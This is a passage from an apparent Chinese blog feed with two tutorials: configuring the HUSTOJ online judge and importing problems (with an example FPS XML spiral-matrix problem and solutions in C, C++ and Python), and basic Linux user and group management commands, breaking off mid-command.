/home/judge/src/web/include/db_info.inc.php 中，设置 <span class="hljs-variable">$OJ_TEMPLATE</span>=<span class="hljs-string">&quot;syzoj&quot;</span>; 即可。“syzoj”为主题名称。默认为 bs3。<br></code></pre></div></td></tr></table></figure><h2 id="3-修改OJ名称"><a href="#3-修改OJ名称" class="headerlink" title="3.修改OJ名称"></a>3.修改OJ名称</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">在 /home/judge/src/web/include/db_info.inc.php 中，找到 <span class="hljs-variable">$OJ_NAME</span>=<span class="hljs-string">&quot;HUSTOJ&quot;</span>; 再修改为自己的名称即可。<br></code></pre></div></td></tr></table></figure><h2 id="4-修改首页"><a href="#4-修改首页" class="headerlink" title="4.修改首页"></a>4.修改首页</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">在 /home/judge/src/web/template/syzoj/index.php 中，调整代码之间的位置即可修改布局。<br>在 /home/judge/src/web/template/syzoj/footer.php 中，可以修改页脚显示信息。<br>在 /home/judge/src/web/template/syzoj/header.php 中，可以修改显示文字等。<br></code></pre></div></td></tr></table></figure><h2 id="5-导题"><a href="#5-导题" class="headerlink" title="5.导题"></a>5.导题</h2><h3 id="5-1-方法一"><a href="#5-1-方法一" class="headerlink" title="5.1 方法一"></a>5.1 方法一</h3><p>直接下载 xml 文件，再进行导入即可。</p><h3 id="5-2-方法二"><a href="#5-2-方法二" class="headerlink" title="5.2 方法二"></a>5.2 方法二</h3><p>直接在后台的 问题-添加 中，手动添加。</p><h3 id="5-3-方法三"><a href="#5-3-方法三" class="headerlink" title="5.3 方法三"></a>5.3 方法三</h3><p>自定义 xml 文件，再进行导入。</p><p>例子：</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>   <br><span class="hljs-tag">&lt;<span class="hljs-name">fps</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.2&quot;</span> <span class="hljs-attr">url</span>=<span class="hljs-string">&quot;https://github.com/zhblue/freeproblemset/&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">generator</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;HUSTOJ&quot;</span> <span class="hljs-attr">url</span>=<span class="hljs-string">&quot;https://github.com/zhblue/hustoj/&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">item</span>&gt;</span><br>   <br><span class="hljs-comment">&lt;!-- title 的内容为 题目标题 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>&lt;![CDATA[方阵填数]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>        <br><span class="hljs-comment">&lt;!-- time_limit 的内容为 时间限制，单位为 秒（s） --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">time_limit</span> <span class="hljs-attr">unit</span>=<span class="hljs-string">&quot;s&quot;</span>&gt;</span>&lt;![CDATA[1]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">time_limit</span>&gt;</span><br>        <br><span class="hljs-comment">&lt;!-- memory_limit 的内容为 内存限制，单位为 MB --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">memory_limit</span> <span class="hljs-attr">unit</span>=<span class="hljs-string">&quot;mb&quot;</span>&gt;</span>&lt;![CDATA[125]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">memory_limit</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- description 的内容为 题目描述 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>&lt;![CDATA[&lt;p&gt;<br>在一个N*N的方阵中，填入1，2，……N*N个数，并要求构成如下的格式：<br>&lt;/p&gt;<br>&lt;p&gt;<br>例如：<br>&lt;/p&gt;<br>&lt;p&gt;<br>N=5<br>&lt;/p&gt;<br>&lt;p&gt;<br>&lt;span style=&quot;font-family:SimSun;&quot;&gt;13 14 15 16 &amp;nbsp;1&lt;/span&gt; <br>&lt;/p&gt;<br>&lt;p&gt;<br>&lt;span style=&quot;font-family:SimSun;&quot;&gt;12 23 24 17 &amp;nbsp;2&lt;/span&gt; <br>&lt;/p&gt;<br>&lt;p&gt;<br>&lt;span style=&quot;font-family:SimSun;&quot;&gt;11 22 25 18 &amp;nbsp;3&lt;/span&gt; <br>&lt;/p&gt;<br>&lt;p&gt;<br>&lt;span style=&quot;font-family:SimSun;&quot;&gt;10 21 20 19 &amp;nbsp;4&lt;/span&gt; <br>&lt;/p&gt;<br>&lt;p&gt;<br>&lt;span style=&quot;font-family:SimSun;&quot;&gt;&amp;nbsp;9 &amp;nbsp;8 &amp;nbsp;7 &amp;nbsp;6 &amp;nbsp;5&lt;/span&gt; <br>&lt;/p&gt;<br>&lt;p&gt;<br>&lt;br /&gt;<br>&lt;/p&gt;<br>&lt;p&gt;<br>N=6<br>&lt;/p&gt;<br>&lt;p&gt;<br>&lt;span style=&quot;font-family:SimSun;&quot;&gt;16 17 18 19 20 &amp;nbsp;1&lt;/span&gt; <br>&lt;/p&gt;<br>&lt;p&gt;<br>&lt;span style=&quot;font-family:SimSun;&quot;&gt;15 30 31 32 21 &amp;nbsp;2&lt;/span&gt; <br>&lt;/p&gt;<br>&lt;p&gt;<br>&lt;span style=&quot;font-family:SimSun;&quot;&gt;14 29 36 33 22 &amp;nbsp;3&lt;/span&gt; <br>&lt;/p&gt;<br>&lt;p&gt;<br>&lt;span style=&quot;font-family:SimSun;&quot;&gt;13 28 35 34 23 &amp;nbsp;4&lt;/span&gt; <br>&lt;/p&gt;<br>&lt;p&gt;<br>&lt;span style=&quot;font-family:SimSun;&quot;&gt;12 27 26 25 24 &amp;nbsp;5&lt;/span&gt; <br>&lt;/p&gt;<br>&lt;p&gt;<br>&lt;span style=&quot;font-family:SimSun;&quot;&gt;11 10 &amp;nbsp;9 &amp;nbsp;8 &amp;nbsp;7 &amp;nbsp;6&lt;/span&gt; <br>&lt;/p&gt;]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span><br>        <br><span class="hljs-comment">&lt;!-- input 内容为 输入格式说明 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span>&gt;</span>&lt;![CDATA[每个测试文件只包含一组测试数据，每组输入一个N。]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">input</span>&gt;</span> <br><br><span class="hljs-comment">&lt;!-- output 内容为 输出格式说明 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">output</span>&gt;</span>&lt;![CDATA[输出构成的方阵。]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">output</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- sample_input 内容为 给出样例和测试数据，会把第一个数据当成为给出样例，会把包括第一个数据和其他数据一起作为测试样例 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">sample_input</span>&gt;</span>&lt;![CDATA[5<br>]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">sample_input</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">sample_output</span>&gt;</span>&lt;![CDATA[13 14 15 16 1<br>12 23 24 17 2<br>11 22 25 18 3<br>10 21 20 19 4<br>9 8 7 6 5<br>]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">sample_output</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">test_input</span>&gt;</span>&lt;![CDATA[10<br>]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">test_input</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">test_output</span>&gt;</span>&lt;![CDATA[28 29 30 31 32 33 34 35 36 1<br>27 58 59 60 61 62 63 64 37 2<br>26 57 80 81 82 83 84 65 38 3<br>25 56 79 94 95 96 85 66 39 4<br>24 55 78 93 100 97 86 67 40 5<br>23 54 77 92 99 98 87 68 41 6<br>22 53 76 91 90 89 88 69 42 7<br>21 52 75 74 73 72 71 70 43 8<br>20 51 50 49 48 47 46 45 44 9<br>19 18 17 16 15 14 13 12 11 10<br>]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">test_output</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">test_input</span>&gt;</span>&lt;![CDATA[1<br>]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">test_input</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">test_output</span>&gt;</span>&lt;![CDATA[ 1<br>]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">test_output</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">test_input</span>&gt;</span>&lt;![CDATA[3<br>]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">test_input</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">test_output</span>&gt;</span>&lt;![CDATA[ 7  8  1<br> 6  9  2<br> 5  4  3<br>]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">test_output</span>&gt;</span><br>        <br><span class="hljs-comment">&lt;!-- hint 内容为 数据范围和提示 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">hint</span>&gt;</span>&lt;![CDATA[&lt;p&gt;<br>6<br>&lt;/p&gt;<br>&lt;p&gt;<br>-------------------------<br>&lt;/p&gt;<br>16 17 18 19 20 1&lt;br /&gt;<br>15 30 31 32 21 2&lt;br /&gt;<br>14 29 36 33 22 3&lt;br /&gt;<br>13 28 35 34 23 4&lt;br /&gt;<br>12 27 26 25 24 5&lt;br /&gt;<br>11 10 9 8 7 6&lt;br /&gt;]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">hint</span>&gt;</span><br>        <br><span class="hljs-comment">&lt;!-- source 内容为 分类标签 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">source</span>&gt;</span>&lt;![CDATA[NOIP全国联赛普及组 1995年NOIP全国联赛普及组]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">source</span>&gt;</span><br>        <br><span class="hljs-comment">&lt;!-- solution 内容为 测试验证代码 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">solution</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;C&quot;</span>&gt;</span>&lt;![CDATA[#include &lt;stdio.h&gt;<br><br>int main (void)<br>&#123;<br>    int i, n, k, ix, iy;<br><br>    scanf(&quot;%d&quot;, &amp;n);<br>    int A[n][n];<br><br>    k = 0;<br>    for(i = 0; i &lt;= n / 2; i++)<br>    &#123;<br>        for(ix = i, iy = n - i - 1; ix &lt; n - i - 1; ix++)<br>        &#123;<br>            k++;<br>            A[ix][iy] = k;<br>        &#125;<br>        for(ix = n - i - 1, iy = n - i - 1; iy &gt; i; iy--)<br>        &#123;<br>            k++;<br>            A[ix][iy] = k;<br>        &#125;<br>        for(ix = n - i - 1, iy = i; ix &gt; i; ix--)<br>        &#123;<br>            k++;<br>            A[ix][iy] = k;<br>        &#125;<br>        for(ix = i, iy = i; iy &lt; n - i - 1; iy++)<br>        &#123;<br>            k++;<br>            A[ix][iy] = k;<br>        &#125;<br>    &#125;<br>    if(n % 2 == 1)    A[n / 2][n / 2] = ++k;<br>    for(ix = 0; ix &lt; n; ix++)<br>    &#123;<br>        for(iy = 0; iy &lt; n; iy++)<br>        &#123;<br>            if(iy &gt; 0)    printf(&quot; &quot;);<br>            if(A[ix][iy] &lt; 10&amp;&amp;(iy == 0||A[ix][iy - 1] &lt; 10))    printf(&quot; &quot;);<br>            printf(&quot;%d&quot;, A[ix][iy]);<br>        &#125;<br>        printf(&quot;\n&quot;);<br>    &#125;<br><br>    return 0;<br>&#125;<br>]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">solution</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">solution</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;C++&quot;</span>&gt;</span>&lt;![CDATA[#include &lt;iostream&gt;<br>#include &lt;string&gt;<br>#include &lt;cstdio&gt;<br>using namespace std;<br>int n;<br>int map[200][200]=&#123;0&#125;;<br>void fill_map(int t,int l,int s)<br>&#123;<br>    for(int i=l+1;i&lt;=s;i++)<br>        map[i][s]=t++;<br>    for(int i=s-1;i&gt;=l+1;i--)<br>        map[s][i]=t++;<br>    for(int i=s-1;i&gt;=l+1;i--)<br>        map[i][l+1]=t++;<br>    for(int i=l+2;i&lt;=s-1;i++)<br>        map[l+1][i]=t++;<br>    if(s&gt;=0) fill_map(t,l+1,s-1);<br>&#125;<br>void print_map1()<br>&#123;<br>    for(int i=1;i&lt;=n;i++)<br>    &#123;<br>        for(int j=1;j&lt;n;j++)<br>            printf(&quot;%2d &quot;,map[i][j]);<br>        printf(&quot;%2d\n&quot;,map[i][n]);<br>    &#125;<br>&#125;<br>void print_map2()<br>&#123;<br>    for(int i=1;i&lt;=n;i++)<br>    &#123;<br>        for(int j=1;j&lt;n;j++)<br>            printf(&quot;%d &quot;,map[i][j]);<br>        printf(&quot;%d\n&quot;,map[i][n]);<br>    &#125;<br>&#125;<br>int main()<br>&#123;<br>    cin&gt;&gt;n;<br>    fill_map(1,0,n);<br>    if(n!=10)<br>        print_map1();<br>    else<br>        print_map2();<br>    return 0;<br>&#125;<br>]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">solution</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">solution</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;Python&quot;</span>&gt;</span>&lt;![CDATA[# coding=utf-8<br>#!/usr/bin/python3<br><br><br>def solve(N):<br>    matrix = [[0 for i in range(0, N)] for i in range(0, N)]<br>    num = 1<br>    N_2 = int((N+1)/2)<br>    for i in range(0, N_2):<br>        x, y = i, N - i - 1<br>        matrix[x][y] = num<br>        while x &lt; y:<br>            matrix[x][y] = num<br>            num += 1<br>            x += 1<br>        while y &gt; i:<br>            matrix[x][y] = num<br>            num += 1<br>            y -= 1<br>        while x &gt; i:<br>            matrix[x][y] = num<br>            num += 1<br>            x -= 1<br>        while y &lt; N - i -1:<br>            matrix[x][y] = num<br>            num += 1<br>            y += 1<br>    return matrix<br><br><br>def print_ans(matrix):<br>    n = len(matrix)<br>    for i in range(0, n):<br>        for j in range(0, n):<br>            if j == 0 and n &lt;= 3:<br>                print(&#x27;&#123;:2d&#125;&#x27;.format(matrix[i][j]), sep=&#x27;&#x27;, end=&#x27;&#x27;)<br>            elif j == 0:<br>                print(&#x27;&#123;:d&#125;&#x27;.format(matrix[i][j]), sep=&#x27;&#x27;, end=&#x27;&#x27;)<br>            elif n &lt;= 3:<br>                print(&#x27; &#123;:2d&#125;&#x27;.format(matrix[i][j]), sep=&#x27;&#x27;, end=&#x27;&#x27;)<br>            else:<br>                print(&#x27; &#123;:d&#125;&#x27;.format(matrix[i][j]), sep=&#x27;&#x27;, end=&#x27;&#x27;)<br>        print(&#x27;&#x27;)<br><br><br>def main():<br>    s = input()<br>    N = int(s)<br>    print_ans(solve(N))<br><br><br>if __name__ == &#x27;__main__&#x27;:<br>    main()<br><br><br>]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">solution</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">item</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">fps</span>&gt;</span><br><br></code></pre></div></td></tr></table></figure><p>如果添加测试数据不行，可以进入题目，在题目页面再添加 测试数据。</p><hr>]]></content>
    
    
    <categories>
      
      <category>学习教程</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux学习-基本命令（四）</title>
    <link href="/2021/05/25/Linux%E5%AD%A6%E4%B9%A0/Linux%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
    <url>/2021/05/25/Linux%E5%AD%A6%E4%B9%A0/Linux%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%EF%BC%88%E5%9B%9B%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>Linux，全称GNU/Linux，是一种免费使用和自由传播的类UNIX操作系统。主要受到Minix和Unix思想的启发，是一个基于POSIX的多用户、多任务、支持多线程和多CPU的操作系统。它能运行主要的Unix工具软件、应用程序和网络协议。它支持32位和64位硬件。Linux继承了Unix以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。Linux有上百种不同的发行版。</p><p>Linux不仅系统性能稳定，而且是开源软件。其核心防火墙组件性能高效、配置简单，保证了系统的安全。在很多企业网络中，为了追求速度和安全，Linux不仅仅是被网络运维人员当作服务器使用，甚至当作网络防火墙。Linux具有开放源码、没有版权、技术社区用户多等特点，开放源码使得用户可以自由裁剪，灵活性高，功能强大，成本低。尤其系统中内嵌网络协议栈，经过适当的配置就可实现路由器的功能。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-用户、权限管理"><a href="#1-用户、权限管理" class="headerlink" title="1.用户、权限管理"></a>1.用户、权限管理</h2><h3 id="1-1-whoami-命令"><a href="#1-1-whoami-命令" class="headerlink" title="1.1 whoami 命令"></a>1.1 whoami 命令</h3><p>查看当前系统当前账号的用户名。可以通过 cat/etc/passwd 查看系统用户信息。</p><h3 id="1-2-who-命令"><a href="#1-2-who-命令" class="headerlink" title="1.2 who 命令"></a>1.2 who 命令</h3><p>查看当前所有登录系统的用户信息。</p><h4 id="1-2-1-选项"><a href="#1-2-1-选项" class="headerlink" title="1.2.1 选项"></a>1.2.1 选项</h4><blockquote><ol><li>-m 或 am i ：只显示运行 who 命令的用户名、登录终端和登录时间</li></ol></blockquote><blockquote><ol start="2"><li>-q 或 –count ：只显示用户的登录账号和登录用户的数量</li></ol></blockquote><blockquote><ol start="3"><li>-u 或 –heading ：显示列标题</li></ol></blockquote><h3 id="1-3-exit-命令"><a href="#1-3-exit-命令" class="headerlink" title="1.3 exit 命令"></a>1.3 exit 命令</h3><p>如果图形界面，退出当前终端。如果是使用 ssh 远程登录，退出登录账户。如果是切换后的登录用户，退出则返回上一个登录账号。</p><h3 id="1-4-useradd-命令"><a href="#1-4-useradd-命令" class="headerlink" title="1.4 useradd 命令"></a>1.4 useradd 命令</h3><p>在 Unix/Linux 中添加用户账号可以使用 adduser 或者 useradd 命令，因为 adduser 命令是指向 useradd 命令的一个链接，因此，这两个命令的使用格式完全一样。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">useradd [参数] 新建用户账号<br></code></pre></div></td></tr></table></figure><h4 id="1-4-1-参数"><a href="#1-4-1-参数" class="headerlink" title="1.4.1 参数"></a>1.4.1 参数</h4><blockquote><ol><li>-d ：指定用户登录系统时的主目录，如果不使用该参数，系统自动在 /home 目录下建立与用户同名目录为主目录</li></ol></blockquote><blockquote><ol start="2"><li>-m ：自动建立目录</li></ol></blockquote><blockquote><ol start="3"><li>-g ：指定组名称</li></ol></blockquote><h4 id="1-4-2-说明"><a href="#1-4-2-说明" class="headerlink" title="1.4.2 说明"></a>1.4.2 说明</h4><p>Linux 每个用户都要有一个主目录，主目录就是第一次登录系统，用户的默认当前目录（/home/用户）。每一个用户必须有一个主目录，所以用 useradd 创建用户的时候，一定给用户指定一个主目录。用户的主目录一般要放到根目录的 home 目录下，用户的主目录和用户名是相同的。如果创建用户的时候，不指定组名，那么系统会自动创建一个和用户名一样的组名。</p><h3 id="1-5-passwd-命令"><a href="#1-5-passwd-命令" class="headerlink" title="1.5 passwd 命令"></a>1.5 passwd 命令</h3><p>在 Unix/Linux 中，超级用户可以使用 passwd 命令为普通用户设置或修改用户口令。用户也可以直接使用该命令来修改自己的口令，而无需在命令后面使用用户名。</p><h3 id="1-6-userdel-命令"><a href="#1-6-userdel-命令" class="headerlink" title="1.6 userdel 命令"></a>1.6 userdel 命令</h3><p>删除用户。</p><blockquote><ol><li>删除 tothefor 用户，但不会自动删除用户的主目录。</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">userdel tothefor<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>删除用户，同时删除用户的主目录</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">userdel -r tothefor<br></code></pre></div></td></tr></table></figure><h3 id="1-7-su-命令"><a href="#1-7-su-命令" class="headerlink" title="1.7 su 命令"></a>1.7 su 命令</h3><p>切换用户。<br>需要注意的是，su 后面可以加 “-”。su 和 su - 命令不同之处在于，su - 切换到对应的用户时会将当前的工作目录自动转换到切换后的用户主目录。</p><h3 id="1-8-查看有哪些用户组"><a href="#1-8-查看有哪些用户组" class="headerlink" title="1.8 查看有哪些用户组"></a>1.8 查看有哪些用户组</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">cat /etc/group<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">groupmod + 三次tab键<br></code></pre></div></td></tr></table></figure><h3 id="1-9-groupadd-命令"><a href="#1-9-groupadd-命令" class="headerlink" title="1.9 groupadd 命令"></a>1.9 groupadd 命令</h3><p>新建组账号。</p><h3 id="1-10-groupdel-命令"><a href="#1-10-groupdel-命令" class="headerlink" title="1.10 groupdel 命令"></a>1.10 groupdel 命令</h3><p>删除组账号。</p><h3 id="1-11-usermod-命令"><a href="#1-11-usermod-命令" class="headerlink" title="1.11 usermod 命令"></a>1.11 usermod 命令</h3><p>修改用户所在组。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">usermod -g 用户组 用户名<br></code></pre></div></td></tr></table></figure><h3 id="1-12-查看用户在哪些组"><a href="#1-12-查看用户在哪些组" class="headerlink" title="1.12 查看用户在哪些组"></a>1.12 查看用户在哪些组</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">groups sunck<br></code></pre></div></td></tr></table></figure><h3 id="1-13-为创建的普通用户添加-sudo-权限"><a href="#1-13-为创建的普通用户添加-sudo-权限" class="headerlink" title="1.13 为创建的普通用户添加 sudo 权限"></a>1.13 为创建的普通用户添加 sudo 权限</h3><p>需要注意的是，新创建的用户，默认不能 sudo，需要进行以下操作。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo usermod -a -G adm 用户名<br>sudo usermod -a -G sudo 